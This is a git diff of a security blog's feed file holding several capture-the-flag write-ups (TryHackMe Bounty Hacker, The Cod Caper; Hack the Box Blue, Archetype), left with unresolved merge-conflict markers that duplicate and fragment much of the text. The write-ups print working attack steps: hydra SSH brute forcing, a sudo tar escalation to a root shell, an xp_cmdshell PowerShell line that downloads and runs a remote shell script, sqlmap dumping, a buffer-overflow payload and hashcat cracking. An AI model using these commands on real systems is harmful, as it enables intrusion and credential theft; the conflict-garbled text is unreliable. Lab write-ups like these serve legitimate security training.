@@ -457,6 +457,17 @@ O resultado foi imediato e horas depois recebi o certificado e badge da MS-900.<
     <img src="/images/ms-900/badge.png"  class="center"  style="border-radius: 10px;"  />
 
 
+<<<<<<< HEAD
+]]></content>
+        </item>
+        
+        <item>
+            <title>TryHackme - Bounty Hacker - Write Up</title>
+            <link>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</link>
+            <pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</guid>
+=======
 
 
 <br>
@@ -474,6 +485,7 @@ O resultado foi imediato e horas depois recebi o certificado e badge da MS-900.<
             <pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate>
             
             <guid>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</guid>
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
             <description>First of all, let&amp;rsquo;s nmap the machine IP.
 └─$ sudo nmap -sS -Pn 10.10.207.23 [sudo] password for venomsnake: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 07:43 -03 Nmap scan report for 10.10.207.23 Host is up (0.20s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 9.</description>
             <content type="html"><![CDATA[
@@ -520,6 +532,12 @@ The other file <code>locks.txt</code> looks like a list of passwords.</p>
 <h2 id="ssh-22">SSH 22</h2>
 <p>Let&rsquo;s use <code>hydra</code> with a list of users. We found one user in the file <code>task.txt</code> but just in case we could use a list of possible users.</p>
 
+<<<<<<< HEAD
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hydra <span style="color:#f92672">-</span>v <span style="color:#f92672">-</span>L users.txt <span style="color:#f92672">-</span>P locks.txt <span style="color:#ae81ff">10.10.207.23</span> ssh <span style="color:#f92672">-</span>t <span style="color:#ae81ff">4</span>
+</span></span></code></pre></div>
+    <img src="/images/tryhackme/bountyhacker/ssh.png"  class="center"  style="border-radius: 10px;"  />
+
+=======
     <img src="/images/tryhackme/bountyhacker/users.png"  class="center"  style="border-radius: 10px;"  />
 
 
@@ -527,14 +545,21 @@ The other file <code>locks.txt</code> looks like a list of passwords.</p>
 </span></span></code></pre></div>
     <img src="/images/tryhackme/bountyhacker/ssh.png"  class="center"  style="border-radius: 10px;"  />
 
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p>We got the lin&rsquo;s password to ssh.</p>
 <p>Finally, we could have access to the host:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ssh lin<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.10.207.23</span>
 </span></span></code></pre></div><p>Now we&rsquo;re looking the <code>users.txt</code> file in ~/Desktop:</p>
+<<<<<<< HEAD
 
     <img src="/images/tryhackme/bountyhacker/txt.png"  class="center"  style="border-radius: 10px;"  />
 
+=======
+
+    <img src="/images/tryhackme/bountyhacker/txt.png"  class="center"  style="border-radius: 10px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p>The next step is to find the <code>root.txt</code> file, but the user lin isn&rsquo;t in the sudoers group.
 So we need to find some way to privesc this host.</p>
@@ -551,6 +576,12 @@ So we need to find some way to privesc this host.</p>
 <p>We have a possible privesc with tar:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>sudo tar <span style="color:#f92672">-</span>cf <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">-</span>action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=/</span>bin<span style="color:#f92672">/</span>sh
 </span></span></code></pre></div><p>That&rsquo;s it! We&rsquo;re root!</p>
+<<<<<<< HEAD
+
+    <img src="/images/tryhackme/bountyhacker/root.png"  class="center"  style="border-radius: 10px;"  />
+
+=======
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
     <img src="/images/tryhackme/bountyhacker/root.png"  class="center"  style="border-radius: 10px;"  />
 
@@ -647,9 +678,15 @@ So we need to find some way to privesc this host.</p>
 </span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https:<span style="color:#75715e">//nmap.org/submit/ .
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">130.01</span> seconds
 </span></span></code></pre></div><p>The host is vulnerable to ms17-10:</p>
+<<<<<<< HEAD
 
     <img src="/images/htb/blue/vuln.png"  class="center"  style="border-radius: 10px;"  />
 
+=======
+
+    <img src="/images/htb/blue/vuln.png"  class="center"  style="border-radius: 10px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <h2 id="exploit">Exploit</h2>
 <p>Let&rsquo;s double-check this vuln with <code>msfconsole</code>.
@@ -676,9 +713,7 @@ Search for &ldquo;ms17-010&rdquo; and use the module: scanner/smb/smb_ms17_010:<
 <h2 id="flag">Flag</h2>
 <p>Search for the flag in the commons users folders.</p>
 
-    <img src="/images/htb/blue/pawnd.PNG"  class="center"  style="border-radius: 8px;"  />
-
-
+<<<<<<< HEAD
 ]]></content>
         </item>
         
@@ -695,12 +730,12 @@ Respostawebmin2. 172.30.0.15 Para explorar essa vulnerabilidade vamos executar
             <content type="html"><![CDATA[
     <img src="/images/featured.JPG"  class="center"  style="border-radius: 10px;"  />
 
+=======
+    <img src="/images/htb/blue/pawnd.PNG"  class="center"  style="border-radius: 8px;"  />
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
-<h5 id="o-intuito-desse-post-não-é-dar-as-respostas-e-sim-documentar-os-passos-e-ferramentas-utilizadas">O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas.</h5>
 
-    <img src="/images/semana08_linux/banner.png"  class="center"  style="border-radius: 10px;"  />
-
-
+<<<<<<< HEAD
 <h2 id="hahahugoshortcode-s2-hbhb-1-17230015"><figure>
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-terminal"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
     </figure> 1. 172.30.0.15</h2>
@@ -1644,10 +1679,27 @@ Acessando o arquivo podemos ver que ele roda um script de uptime:</p>
             <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
             
             <guid>https://nmmorette.github.io/posts/2021/07/hack-the-box-archetype-write-up/</guid>
+=======
+]]></content>
+        </item>
+        
+        <item>
+            <title>Hack the Box - Archetype - Write Up</title>
+            <link>https://nmmorette.github.io/posts/2021/07/hack-the-box-archetype-write-up/</link>
+            <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2021/07/hack-the-box-archetype-write-up/</guid>
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
             <description>Enumeration Initial scan:
 nmap -sSV 10.10.10.27 Second nmap scan with --script vuln
 We found a possible starting point: CVE-2008-4250.
 SMB Enumeration The next step is to try to connect in the SMB service:
+<<<<<<< HEAD
+smbclient -L \\10.10.10.27 -N IPC$: this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</description>
+            <content type="html"><![CDATA[
+
+<br>
+=======
 smbclient -L \\10.10.10.27 -N IPC$: this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</description>
             <content type="html"><![CDATA[
 
@@ -1655,14 +1707,21 @@ smbclient -L \\10.10.10.27 -N IPC$: this hidden share is a special share used fo
 
 
     <img src="/images/htb/archetype/banner.png"  class="center"  style="border-radius: 10px;"  />
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 
 <h2 id="enumeration">Enumeration</h2>
 <p>Initial scan:</p>
 <pre tabindex="0"><code class="language-cli" data-lang="cli"> nmap -sSV 10.10.10.27
+<<<<<<< HEAD
 </code></pre>
     <img src="/images/htb/archetype/scan.png"  class="center"  style="border-radius: 10px;"  />
 
+=======
+</code></pre>
+    <img src="/images/htb/archetype/scan.png"  class="center"  style="border-radius: 10px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p>Second nmap scan with <code>--script vuln</code></p>
 
@@ -1673,9 +1732,15 @@ smbclient -L \\10.10.10.27 -N IPC$: this hidden share is a special share used fo
 <h2 id="smb-enumeration">SMB Enumeration</h2>
 <p>The next step is to try to connect in the SMB service:</p>
 <pre tabindex="0"><code class="language-cli" data-lang="cli"> smbclient -L \\10.10.10.27 -N
+<<<<<<< HEAD
 </code></pre>
     <img src="/images/htb/archetype/smb.png"  class="center"  style="border-radius: 10px;"  />
 
+=======
+</code></pre>
+    <img src="/images/htb/archetype/smb.png"  class="center"  style="border-radius: 10px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p><strong>IPC$:</strong> this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</p>
 <p><strong>backups:</strong> a normal share with read access. It lacks a comment which means it could contain interesting data if we’re able to connect to it.</p>
@@ -1767,9 +1832,15 @@ smbclient -L \\10.10.10.27 -N IPC$: this hidden share is a special share used fo
 We only need to execute the payload in the target and wait for connection into the <code>Netcat</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>xp_cmdshell <span style="color:#e6db74">&#34;powershell &#34;</span>IEX (New<span style="color:#f92672">-</span>Object Net.WebClient).DownloadString(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;http://10.10.16.113/shell2.ps1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">);&#34;</span>
 </span></span></code></pre></div><p>After that we have the shell:</p>
+<<<<<<< HEAD
 
     <img src="/images/htb/archetype/shell.png"  class="center"  style="border-radius: 8px;"  />
 
+=======
+
+    <img src="/images/htb/archetype/shell.png"  class="center"  style="border-radius: 8px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <h2 id="first-key">First Key</h2>
 <p>For the first key we need to enumerate the files:</p>
@@ -1779,9 +1850,15 @@ We only need to execute the payload in the target and wait for connection into t
 
 <h2 id="privileged-user-access">Privileged user access</h2>
 <p>Now that we have the users&rsquo; flag, we need to focus on the administrator flag. Maybe the flag is in the administrator’s folder, but our user don&rsquo;t have access. We need to privesc our shell. A very useful checklist to do that:  <a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">Hacktricks</a>.</p>
+<<<<<<< HEAD
 
     <img src="/images/htb/archetype/checklist.png"  class="center"  style="border-radius: 10px;"  />
 
+=======
+
+    <img src="/images/htb/archetype/checklist.png"  class="center"  style="border-radius: 10px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p>One interesting point in the checklist is the Power Shell history.</p>
 <p>The located path is:
@@ -1938,6 +2015,7 @@ Look at the results and search for True in the <code>Can Restart</code> option:<
 <p>We have an administrator shell, search for the key in the Administrator&rsquo;s folder.</p>
 <p><strong>What is the root flag ?</strong></p>
 <p><code>9af5f314f57607c00fd09803a587db80</code></p>
+<<<<<<< HEAD
 ]]></content>
         </item>
         
@@ -2931,6 +3009,17 @@ Então vamos fazer o  scan completo nesse host:</p>
             <pubDate>Fri, 09 Jul 2021 00:00:00 +0000</pubDate>
             
             <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/</guid>
+=======
+]]></content>
+        </item>
+        
+        <item>
+            <title>TryHackme - Pre-Security Path - Review</title>
+            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/</link>
+            <pubDate>Fri, 09 Jul 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/</guid>
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
             <description>Do you want to be a hacker? An IT professional? Or maybe just know about thechnology.But you don&amp;rsquo;t know where to start. Try Hack Me is definitely the right place for you!
 Especially now with the new Pre Security learn path.
 You don&amp;rsquo;t need to be an IT pro for start here. This learning path will take you by the hand and show the basics of cyber security. You will learn about:</description>
@@ -3009,9 +3098,7 @@ Pre security is the best start point for beginners, after that THM have new path
 
 </p>
 
-
-<br>
-
+<<<<<<< HEAD
 ]]></content>
         </item>
         
@@ -3027,12 +3114,12 @@ Curl curl -s -I 172.16.1.60 | grep &amp;#34;Server&amp;#34; Wget wget -q -S 172.
             <content type="html"><![CDATA[
     <img src="/images/featured.JPG"  class="center"  style="border-radius: 10px;"  />
 
+=======
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
-<h5 id="o-intuito-desse-post-não-é-dar-as-respostas-e-sim-documentar-os-passos-e-ferramentas-utilizadas">O intuito desse post não é dar as respostas e sim documentar os passos e ferramentas utilizadas.</h5>
+<br>
 
-    <img src="/images/semana-05-vpn/banner.JPG"  class="center"  style="border-radius: 10px;"  />
-
-
+<<<<<<< HEAD
 <p>Conecte na vpn da Desec para realizar esses labs.</p>
 <h2 id="hahahugoshortcode-s2-hbhblab-01"><figure>
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-terminal"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
@@ -4246,6 +4333,23 @@ Hello there my name is Pingu. I&#39;ve come here to put in a request to get my f
             <content type="html"><![CDATA[
     <img src="/images/thecodcaper/novo.jpg"  class="center"  style="border-radius: 10px;"  />
 
+=======
+]]></content>
+        </item>
+        
+        <item>
+            <title>TryHackme - The Cod Caper - Write Up</title>
+            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/</link>
+            <pubDate>Thu, 01 Jul 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-write-up/</guid>
+            <description>Task 1. Intro This is a write up for &amp;ldquo;The Cod Caper&amp;rdquo; room at Try Hack Me.
+Room&amp;rsquo;s intro note:
+Hello there my name is Pingu. I&#39;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&#39;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server.</description>
+            <content type="html"><![CDATA[
+    <img src="/images/thecodcaper/novo.jpg"  class="center"  style="border-radius: 10px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <h2 id="task-1-intro">Task 1. Intro</h2>
 <p>This is a write up for &ldquo;The Cod Caper&rdquo; <a href="https://tryhackme.com/room/thecodcaper">room</a> at Try Hack Me.</p>
@@ -4288,9 +4392,12 @@ Edit the file with a wordlist of your preference. I suggest the big.txt from <co
 <h2 id="task-4-web-exploitation">Task 4. Web Exploitation</h2>
 <p>Now we have an administrator page but we don&rsquo;t have credentials to log in. So let&rsquo;s try some SQL injection using the  <code>sqlmap</code>.</p>
 
+<<<<<<< HEAD
+=======
     <img src="/images/thecodcaper/sql.jpg"  class="center"  style="border-radius: 8px;"  />
 
 
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 <pre tabindex="0"><code class="language-cli" data-lang="cli">  sqlmap -u http://10.10.41.158/administrator.php --forms --dump
 </code></pre><p>Flags used:</p>
 <p><code>-u</code> = Specifies which url to attack.</p>
@@ -4368,9 +4475,15 @@ LinEnum is a bash script that searches for possible ways to priv esc. It is incr
 <h2 id="task-7-pwndbg">Task 7. pwndbg</h2>
 <p>We found an interesting file in the step above, moreover as explained in Tryhackme,this file expects 32 characters in the input now we used <code>gdb</code> to analyze.</p>
 <pre tabindex="0"><code class="language-cli" data-lang="cli">   gdb /opt/secret/root
+<<<<<<< HEAD
 </code></pre>
     <img src="/images/thecodcaper/gbd.jpg"  class="center"  style="border-radius: 8px;"  />
 
+=======
+</code></pre>
+    <img src="/images/thecodcaper/gbd.jpg"  class="center"  style="border-radius: 8px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p>The <code>pwndbg</code> has successfully been initialized. The next phase is to test if anything happens when we send more then 32 characters.</p>
 <p>Type:</p>
@@ -4397,6 +4510,14 @@ Luckily cyclic provides this functionality with the -l flag, running <code>cycli
 <h2 id="task-8-binary-exploitation-manually--9-the-pwntools-way">Task 8. Binary-Exploitation: Manually | 9. The pwntools way</h2>
 <p>These two steps lead us to the same result, we&rsquo;re going with step 8 pass in this write up, but feel free to try the pwntools way.</p>
 
+<<<<<<< HEAD
+<pre tabindex="0"><code class="language-pwndbg" data-lang="pwndbg">        disassemble shell 
+</code></pre>
+
+<blockquote>
+What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!
+</blockquote>
+=======
 
 <blockquote>
 Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up
@@ -4408,10 +4529,12 @@ Previously we figured out that we need to provide 44 characters of input, and th
 <blockquote>
 What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!
 </blockquote>
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p>We can use python to do this:</p>
 <p>Python conversion:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>     python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;</span>
+<<<<<<< HEAD
 </span></span></code></pre></div>
 
 <blockquote>
@@ -4421,6 +4544,17 @@ We print 44 random characters(in this case A) and then our memory address in lit
 
 </blockquote>
 
+=======
+</span></span></code></pre></div>
+
+<blockquote>
+
+The command above  will output the payload we want, but it requires manually converting to little endian.
+We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary*
+
+</blockquote>
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>      python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print &#34;A&#34;*44 + &#34;</span><span style="color:#ae81ff">\xcb\x84\x04\x08</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">|</span> <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>secret<span style="color:#f92672">/</span>root
 </span></span></code></pre></div><p>Save the hash!</p>
 <h2 id="task-10-finish-the-job">Task 10. Finish the job</h2>
@@ -4433,9 +4567,15 @@ We print 44 random characters(in this case A) and then our memory address in lit
 
 <p>Luckily hashcat supports cracking linux password hashes. You can find a list of hashcat modes <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a> and <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou</a>(a popular wordlist) here (if you don&rsquo;t already have it on your system yet)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> pingu.hash /usr/share/wordlists/rockyou.txt
+<<<<<<< HEAD
 </span></span></code></pre></div>
     <img src="/images/thecodcaper/5.gif"  class="center"  style="border-radius: 3px;"  />
 
+=======
+</span></span></code></pre></div>
+    <img src="/images/thecodcaper/5.gif"  class="center"  style="border-radius: 3px;"  />
+
+>>>>>>> ea8faaca64ffc3bcf2f57b4ccdd7f4468c4244fc
 
 <p>Flags:</p>
 <p><code>-a</code> = Specify attack mode,attack modes can be found in the man page.</p>
